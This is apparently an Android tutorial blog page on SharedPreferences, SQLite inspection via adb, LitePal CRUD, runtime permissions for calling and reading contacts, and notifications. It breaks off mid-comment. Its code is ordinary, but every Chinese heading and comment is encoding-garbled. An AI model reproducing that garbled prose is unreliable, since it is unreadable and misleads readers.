<h3 id="SharePreferences-é€šè¿‡é”®å€¼å¯¹å­˜å‚¨æ•°æ®"><a href="#SharePreferences-é€šè¿‡é”®å€¼å¯¹å­˜å‚¨æ•°æ®" class="headerlink" title="SharePreferences(é€šè¿‡é”®å€¼å¯¹å­˜å‚¨æ•°æ®)"></a>SharePreferences(é€šè¿‡é”®å€¼å¯¹å­˜å‚¨æ•°æ®)</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//äº‹å…ˆå®šä¹‰ä¸¤ä¸ªæŒ‰é’®ï¼Œä¸€ä¸ªå­˜å‚¨æ•°æ®æŒ‰é’®ä¸€ä¸ªæ¢å¤æ•°æ®æŒ‰é’®</span></span><br><span class="line"><span class="comment">//å­˜å‚¨æ•°æ®</span></span><br><span class="line">Button button = (Button) findViewById(R.id.button);</span><br><span class="line">        button.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                SharedPreferences.Editor editor = getSharedPreferences(<span class="string">&quot;data&quot;</span>,MODE_PRIVATE).edit();</span><br><span class="line">                editor.putString(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;tom&quot;</span>);</span><br><span class="line">                editor.putInt(<span class="string">&quot;age&quot;</span>,<span class="number">23</span>);</span><br><span class="line">                editor.putBoolean(<span class="string">&quot;married&quot;</span>,<span class="keyword">false</span>);</span><br><span class="line">                editor.apply();</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ¢å¤æ•°æ®</span></span><br><span class="line">        Button button1 = (Button)findViewById(R.id.restore_button);</span><br><span class="line">        button1.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                String TAG = <span class="string">&quot;mylog&quot;</span>;</span><br><span class="line">                SharedPreferences pref = getSharedPreferences(<span class="string">&quot;data&quot;</span>,MODE_PRIVATE);</span><br><span class="line">                String name = pref.getString(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line">                <span class="keyword">int</span> age = pref.getInt(<span class="string">&quot;age&quot;</span>,<span class="number">1</span>);</span><br><span class="line">                <span class="keyword">boolean</span> married = pref.getBoolean(<span class="string">&quot;married&quot;</span>,<span class="keyword">true</span>);</span><br><span class="line">                Log.d(TAG, <span class="string">&quot;name is &quot;</span>+name);</span><br><span class="line">                Log.d(TAG, <span class="string">&quot;age is &quot;</span>+age);</span><br><span class="line">                Log.d(TAG, <span class="string">&quot;married is&quot;</span> +married);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure>

<h2 id="æ•°æ®åº“"><a href="#æ•°æ®åº“" class="headerlink" title="æ•°æ®åº“"></a>æ•°æ®åº“</h2><p>adbæ“ä½œ</p>
<ul>
<li>adb shellè¿›å…¥è°ƒè¯•</li>
<li>suææƒè·å¾—rootæƒé™</li>
<li>cdåˆ°ç¨‹åºæ–‡ä»¶ç›®å½•ï¼Œä¸€èˆ¬ä¸º<code>/data/data/åŒ…å/</code></li>
</ul>
<p>sqliteæ“ä½œ</p>
<ol>
<li><code>sqlite3 databse.db</code> è¿›å…¥åä¸ºdatabase.dbçš„æ•°æ®åº“</li>
<li>.<code>table</code>ã€€åˆ—å‡ºè¡¨ã€€ã€€ <code>.schema</code>ã€€åˆ—å‡ºæ‰€æœ‰è¡¨ç»“æ„ã€€ã€€ <code>.exit</code>ã€€ã€€é€€å‡ºsqliteäº¤äº’å¼å‘½ä»¤</li>
<li>æŸ¥è¯¢ã€€ã€€ã€€<code>select * from table_name</code></li>
</ol>
<h3 id="litepalæ“ä½œsqliteæ•°æ®åº“"><a href="#litepalæ“ä½œsqliteæ•°æ®åº“" class="headerlink" title="litepalæ“ä½œsqliteæ•°æ®åº“"></a>litepalæ“ä½œsqliteæ•°æ®åº“</h3><ul>
<li><p>é…ç½®</p>
<h4 id="1-Include-library"><a href="#1-Include-library" class="headerlink" title="1. Include library"></a>1. Include library</h4><p>Edit your <strong>build.gradle</strong> file and add below dependency.</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">dependencies &#123;</span><br><span class="line">    implementation <span class="string">&#x27;org.litepal.guolindev:core:3.2.2&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-Configure-litepal-xml"><a href="#2-Configure-litepal-xml" class="headerlink" title="2. Configure litepal.xml"></a>2. Configure litepal.xml</h4><p>Create a file in the <strong>assets</strong> folder of your project and name it as <strong>litepal.xml</strong>. Then copy the following codes into it.</p>
<p>å†é¡¹ç›®æ–‡ä»¶å¤¹ä¸‹å³é”®æ–°å»ºä¸€ä¸ªasset folder - ç„¶åæ·»åŠ ä¸€ä¸ªæ–‡ä»¶å‘½åä¸ºlitepal.xmlï¼Œå¤åˆ¶ç²˜è´´ä»¥ä¸‹å†…å®¹</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">litepal</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">    	Define the database name of your application. </span></span><br><span class="line"><span class="comment">    	By default each database name should be end with .db. </span></span><br><span class="line"><span class="comment">    	If you didn&#x27;t name your database end with .db, </span></span><br><span class="line"><span class="comment">    	LitePal would plus the suffix automatically for you.</span></span><br><span class="line"><span class="comment">    	For example:    </span></span><br><span class="line"><span class="comment">    	&lt;dbname value=&quot;demo&quot; /&gt;</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dbname</span> <span class="attr">value</span>=<span class="string">&quot;demo&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">    	Define the version of your database. Each time you want </span></span><br><span class="line"><span class="comment">    	to upgrade your database, the version tag would helps.</span></span><br><span class="line"><span class="comment">    	Modify the models you defined in the mapping tag, and just </span></span><br><span class="line"><span class="comment">    	make the version value plus one, the upgrade of database</span></span><br><span class="line"><span class="comment">    	will be processed automatically without concern.</span></span><br><span class="line"><span class="comment">			For example:    </span></span><br><span class="line"><span class="comment">    	&lt;version value=&quot;1&quot; /&gt;</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">    	Define your models in the list with mapping tag, LitePal will</span></span><br><span class="line"><span class="comment">    	create tables for each mapping class. The supported fields</span></span><br><span class="line"><span class="comment">    	defined in models will be mapped into columns.</span></span><br><span class="line"><span class="comment">    	For example:    </span></span><br><span class="line"><span class="comment">    	&lt;list&gt;</span></span><br><span class="line"><span class="comment">    		&lt;mapping class=&quot;com.test.model.Reader&quot; /&gt;</span></span><br><span class="line"><span class="comment">    		&lt;mapping class=&quot;com.test.model.Magazine&quot; /&gt;</span></span><br><span class="line"><span class="comment">    	&lt;/list&gt;</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mapping</span> <span class="attr">class</span>=<span class="string">&quot;åŒ…å.ç±»å&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">        Define where the .db file should be. &quot;internal&quot; means the .db file</span></span><br><span class="line"><span class="comment">        will be stored in the database folder of internal storage which no</span></span><br><span class="line"><span class="comment">        one can access. &quot;external&quot; means the .db file will be stored in the</span></span><br><span class="line"><span class="comment">        path to the directory on the primary external storage device where</span></span><br><span class="line"><span class="comment">        the application can place persistent files it owns which everyone</span></span><br><span class="line"><span class="comment">        can access. &quot;internal&quot; will act as default.</span></span><br><span class="line"><span class="comment">        For example:</span></span><br><span class="line"><span class="comment">        &lt;storage value=&quot;external&quot; /&gt;</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">litepal</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>This is the only configuration file, and the properties are simple.</p>
<ul>
<li><strong>dbname</strong> configure the database name of project.</li>
<li><strong>version</strong> configure the version of database. Each time you want to upgrade database, plus the value here.</li>
<li><strong>list</strong> configure the mapping classes.</li>
<li><strong>storage</strong> configure where the database file should be stored. <strong>internal</strong> and <strong>external</strong> are the only valid options.</li>
</ul>
<h4 id="3-Configure-LitePalApplication"><a href="#3-Configure-LitePalApplication" class="headerlink" title="3. Configure LitePalApplication"></a>3. Configure LitePalApplication</h4><p>You donâ€™t want to pass the Context param all the time. To makes the APIs simple, just configure the LitePalApplication in <strong>AndroidManifest.xml</strong> as below:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">manifest</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:name</span>=<span class="string">&quot;org.litepal.LitePalApplication&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">...</span></span></span><br><span class="line"><span class="tag">    &gt;</span></span><br><span class="line">        ...</span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>Of course you may have your own Application and has already configured here, like:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">manifest</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:name</span>=<span class="string">&quot;com.example.MyOwnApplication&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">...</span></span></span><br><span class="line"><span class="tag">    &gt;</span></span><br><span class="line">        ...</span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>Thatâ€™s OK. LitePal can still live with that. Just call <strong>LitePal.initialize(context)</strong> in your own Application:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyOwnApplication</span> <span class="keyword">extends</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate();</span><br><span class="line">        LitePal.initialize(<span class="keyword">this</span>);<span class="comment">//ç›´æ¥ä½¿ç”¨è¿™ä¸ªä¹Ÿè¡Œï¼Œæˆ–è€…æŒ‰ç…§ä¸Šé¢æ­¥éª¤å»æ³¨å†Œå…¨å±€é…ç½®</span></span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Make sure to call this method as early as you can. In the <strong>onCreate()</strong> method of Application will be fine. And always remember to use the application context as parameter. Do not use any instance of activity or service as parameter, or memory leaks might happen.</p>
</li>
<li><p>ä½¿ç”¨</p>
<p>åˆ›å»ºä¸€ä¸ªç±»,åå­—å°±ä¸ºmappingä¸­çš„ç±»åï¼Œ</p>
<p>å‡è®¾æœ‰ä¸€ä¸ªç±»book,</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Book</span> <span class="keyword">extends</span> <span class="title">LitePalSupport</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">double</span> price;</span><br><span class="line">    <span class="keyword">private</span> String author;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> pages;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String press;</span><br><span class="line">    <span class="comment">//çœç•¥æ‰€æœ‰å±æ€§çš„set &amp; get</span></span><br></pre></td></tr></table></figure>



<p>ç„¶åå†MainActivityä¸­<code>Connector.getDatabase();</code>å³å®Œæˆäº†å¯¹æ•°æ®åº“çš„åˆ›å»ºï¼Œç»“æ„å°±æ˜¯Bookä¸­å®šä¹‰çš„</p>
<ul>
<li><p>å¢</p>
<p><strong>å¯¹äºå¢åŠ æ•°æ®çš„ç±»æ¯”å¦‚Bookéœ€è¦ç»§æ‰¿ã€€<code>extends LitePalSupport</code>ã€€æ‰å¯ä»¥å¢åŠ è®°å½•.</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//MainActivity</span></span><br><span class="line"> Book book =<span class="keyword">new</span> Book();</span><br><span class="line">                book.setName(<span class="string">&quot;The Da Vinci Code&quot;</span>);</span><br><span class="line">                book.setAuthor(<span class="string">&quot;Dan Brown&quot;</span>);</span><br><span class="line">                book.setPages(<span class="number">454</span>);</span><br><span class="line">                book.setPress(<span class="string">&quot;Unknow&quot;</span>);</span><br><span class="line">                book.setPrice(<span class="number">16.96</span>);</span><br><span class="line">                book.save();</span><br></pre></td></tr></table></figure></li>
<li><p>æ›´æ–°</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">                Book book = <span class="keyword">new</span> Book();</span><br><span class="line">                book.setPrice(<span class="number">14.59</span>);</span><br><span class="line">                book.setPress(<span class="string">&quot;Anchor&quot;</span>);</span><br><span class="line">                book.updateAll(<span class="string">&quot;name = ? and author = ?&quot;</span>,<span class="string">&quot;The Da Vinci Code&quot;</span>,<span class="string">&quot;Dan Brown&quot;</span>);</span><br><span class="line"><span class="comment">//æ›´æ–°è¡¨ä¸­ä¹¦åä¸ºThe Da Vinci Codeã€€ä¸”ä½œè€…ä¸ºDan Brownçš„ä¹¦å‡ºç‰ˆç¤¾ï¼Œä»·æ ¼</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//æ›´æ–°æ‰€æœ‰ä¹¦çš„é¡µæ•°åˆå§‹å€¼</span></span><br><span class="line">Book book = <span class="keyword">new</span> Book();</span><br><span class="line">book.setToDefault(<span class="string">&quot;pages&quot;</span>);</span><br><span class="line">book.updateAll();</span><br></pre></td></tr></table></figure></li>
<li><p>åˆ é™¤</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//åˆ é™¤ä»·æ ¼ä½äºï¼‘ï¼•çš„è®°å½•</span></span><br><span class="line">LitePal.deleteAll(Book.class,<span class="string">&quot;price &lt; ?&quot;</span>,<span class="string">&quot;15&quot;</span>);</span><br></pre></td></tr></table></figure></li>
<li><p>æŸ¥è¯¢</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;Book&gt; books = LitePal.findAll(Book.class);</span><br><span class="line"><span class="keyword">for</span>(Book book:books)</span><br><span class="line">&#123;</span><br><span class="line">    Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;book name is &quot;</span>+book.getName());</span><br><span class="line">    Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;book author is &quot;</span>+book.getAuthor());</span><br><span class="line">    Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;book pages is &quot;</span>+book.getPages());</span><br><span class="line">    Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;book price is &quot;</span>+book.getPrice());</span><br><span class="line">    Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;book press is &quot;</span>+book.getPress());</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>æ›´å¤š</p>
<ul>
<li><a href="http://blog.csdn.net/guolin_blog/category_9262963.html">http://blog.csdn.net/guolin_blog/category_9262963.html</a></li>
<li><a href="https://github.com/guolindev/LitePal">https://github.com/guolindev/LitePal</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="Context-Provider"><a href="#Context-Provider" class="headerlink" title="Context Provider"></a>Context Provider</h2><p>  ä¸»è¦ç”¨äºåœ¨ä¸åŒçš„åº”ç”¨ç¨‹åºä¹‹é—´çš„æ•°æ®å…±äº«åŠŸèƒ½ï¼Œå®ƒæä¾›ä¸€å¥—å®Œæ•´çš„æœºåˆ¶ï¼Œå…è®¸ä¸€ä¸ªç¨‹åºè®¿é—®å¦ä¸€ä¸ªç¨‹åºä¸­çš„æ•°æ®ï¼ŒåŒæ—¶è¿˜èƒ½ä¿è¯è¢«è®¿é—®ç¨‹åºçš„å®‰å…¨æ€§ã€‚</p>
<p>è¿è¡Œæ—¶æƒé™</p>
<ul>
<li>å®‰å“ï¼–å¼€å§‹å¯¹ä½¿ç”¨çš„è¿è¡Œæ—¶æƒé™ï¼Œåœ¨ç¨‹åºè¿è¡Œæ—¶å¯¹æƒé™æå‡ºç”³è¯·</li>
</ul>
<h3 id="ä¾‹å­æ‹¨æ‰“ç”µè¯"><a href="#ä¾‹å­æ‹¨æ‰“ç”µè¯" class="headerlink" title="ä¾‹å­æ‹¨æ‰“ç”µè¯"></a>ä¾‹å­æ‹¨æ‰“ç”µè¯</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Manifest.xmlä¸­æ·»åŠ æƒé™ç”³è¯·--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.CALL_PHONE&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//MainActivity </span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        Button makeCall = (Button) findViewById(R.id.make_call);</span><br><span class="line">        makeCall.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                <span class="comment">//æŸ¥çœ‹æ˜¯å¦æœ‰æ‹¨æ‰“ç”µè¯çš„æƒé™ï¼Œå¦‚æœæœ‰ï¼Œè°ƒç”¨call()è¿›è¡Œæ‹¨æ‰“ï¼›å¦åˆ™ç”³è¯·æƒé™</span></span><br><span class="line">                <span class="keyword">if</span>(ContextCompat.checkSelfPermission(MainActivity.<span class="keyword">this</span>, Manifest.permission.CALL_PHONE)!= PackageManager.PERMISSION_GRANTED)</span><br><span class="line">                &#123;</span><br><span class="line">                    ActivityCompat.requestPermissions(MainActivity.<span class="keyword">this</span>,<span class="keyword">new</span> String[]&#123;Manifest.permission.CALL_PHONE&#125;,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    call();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//ä½¿ç”¨intentæ¥æ‹¨æ‰“ç”µè¯</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">call</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Intent intent = <span class="keyword">new</span> Intent(Intent.ACTION_CALL);</span><br><span class="line">            intent.setData(Uri.parse(<span class="string">&quot;tel:10086&quot;</span>));</span><br><span class="line">            startActivity(intent);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (SecurityException e)</span><br><span class="line">        &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//checkSelfPermissionçš„å›è°ƒå‡½æ•°ï¼Œä¼šå°†ç»“æœè¿”å›åˆ°è¿™ä¸ªå‡½æ•°ä¸­ï¼Œè¿›è¡Œè¿›ä¸€æ­¥çš„å¤„ç†</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onRequestPermissionsResult</span><span class="params">(<span class="keyword">int</span> requestCode, <span class="meta">@NonNull</span> String[] permissions, <span class="meta">@NonNull</span> <span class="keyword">int</span>[] grantResults)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (requestCode) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">if</span> (grantResults.length &gt; <span class="number">0</span> &amp;&amp; grantResults[<span class="number">0</span>] == PackageManager.PERMISSION_GRANTED)</span><br><span class="line">                    call();</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    Toast.makeText(<span class="keyword">this</span>,<span class="string">&quot;you denied the permission&quot;</span>,Toast.LENGTH_SHORT).show();</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>





<h3 id="ä¾‹å­æ˜¾ç¤ºè”ç³»äººåˆ—è¡¨"><a href="#ä¾‹å­æ˜¾ç¤ºè”ç³»äººåˆ—è¡¨" class="headerlink" title="ä¾‹å­æ˜¾ç¤ºè”ç³»äººåˆ—è¡¨"></a>ä¾‹å­æ˜¾ç¤ºè”ç³»äººåˆ—è¡¨</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--æ·»åŠ æƒé™å£°æ˜--&gt;</span>   </span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.READ_CONTACTS&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ArrayAdapter&lt;String&gt; adapter;</span><br><span class="line">    List&lt;String&gt; contactsList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        ListView contactsView = (ListView) findViewById(R.id.contacts_view);</span><br><span class="line">        adapter = <span class="keyword">new</span> ArrayAdapter&lt;String&gt;(<span class="keyword">this</span>, android.R.layout.simple_list_item_1,contactsList);</span><br><span class="line">        contactsView.setAdapter(adapter);</span><br><span class="line">        <span class="keyword">if</span>(ContextCompat.checkSelfPermission(<span class="keyword">this</span>,Manifest.permission.READ_CONTACTS)!= PackageManager.PERMISSION_GRANTED)</span><br><span class="line">        &#123;</span><br><span class="line">            ActivityCompat.requestPermissions(<span class="keyword">this</span>,<span class="keyword">new</span> String[]&#123;Manifest.permission.READ_CONTACTS&#125;,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            readContacts();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è°ƒç”¨getContentResolverçš„queryçš„æ–¹æ³•ï¼Œä¼šè¿”å›ä¸€ä¸ªcursorï¼Œéœ€è¦å–å‡ºå½“ä¸­çš„å†…å®¹</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readContacts</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Cursor cursor = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line">            <span class="keyword">if</span>(cursor != <span class="keyword">null</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">while</span> ( cursor.moveToNext())</span><br><span class="line">                &#123;</span><br><span class="line">                    String displayName = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));</span><br><span class="line">                    String number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));</span><br><span class="line">                    contactsList.add(displayName+<span class="string">&quot;\n&quot;</span>+number);</span><br><span class="line">                &#125;</span><br><span class="line">                adapter.notifyDataSetChanged();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception e)</span><br><span class="line">        &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(cursor != <span class="keyword">null</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                cursor.close();<span class="comment">//å…³é—­æ¸¸æ ‡</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onRequestPermissionsResult</span><span class="params">(<span class="keyword">int</span> requestCode, <span class="meta">@NonNull</span> String[] permissions, <span class="meta">@NonNull</span> <span class="keyword">int</span>[] grantResults)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (requestCode)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">if</span>(grantResults.length &gt;<span class="number">0</span> &amp;&amp; grantResults[<span class="number">0</span>] == PackageManager.PERMISSION_GRANTED)</span><br><span class="line">                    readContacts();</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    Toast.makeText(<span class="keyword">this</span>,<span class="string">&quot;you denied the permission&quot;</span>,Toast.LENGTH_SHORT).show();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="è‡ªå®šä¹‰å†…å®¹æä¾›å™¨"><a href="#è‡ªå®šä¹‰å†…å®¹æä¾›å™¨" class="headerlink" title="è‡ªå®šä¹‰å†…å®¹æä¾›å™¨"></a>è‡ªå®šä¹‰å†…å®¹æä¾›å™¨</h3><p>ç”¨äºä¸åŒåº”ç”¨ä¹‹é—´æ•°æ®åº“äº’ç›¸è®¿é—®çš„æ¥å£ã€‚</p>
<p>å‚è€ƒä¹¦ï¼—ï¼ï¼”</p>
<h2 id="é€šçŸ¥"><a href="#é€šçŸ¥" class="headerlink" title="é€šçŸ¥"></a>é€šçŸ¥</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    </span><br><span class="line"><span class="comment">//MainActivity.java</span></span><br><span class="line"><span class="meta">@RequiresApi(api = Build.VERSION_CODES.O)</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        createNotificationChannel();</span><br><span class="line">        Button sendNotice =(Button) findViewById(R.id.send_notice);</span><br><span class="line">        sendNotice.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                NotificationCompat.Builder builder = <span class="keyword">new</span> NotificationCompat.Builder(MainActivity.<span class="keyword">this</span>, <span class="string">&quot;text&quot;</span>)<span class="comment">//é€šé“å</span></span><br><span class="line">                        .setSmallIcon(R.drawable.ic_launcher_background)</span><br><span class="line">                        .setContentTitle(<span class="string">&quot;test&quot;</span>)</span><br><span class="line">                        .setContentText(<span class="string">&quot;this is a test notification&quot;</span>)</span><br><span class="line">                        .setPriority(NotificationCompat.PRIORITY_DEFAULT);</span><br><span class="line"></span><br><span class="line">				<span class="comment">//æ˜¾ç¤ºé€šçŸ¥</span></span><br><span class="line">                NotificationManagerCompat notificationManager = NotificationManagerCompat.from(MainActivity.<span class="keyword">this</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// notificationId is a unique int for each notification that you must 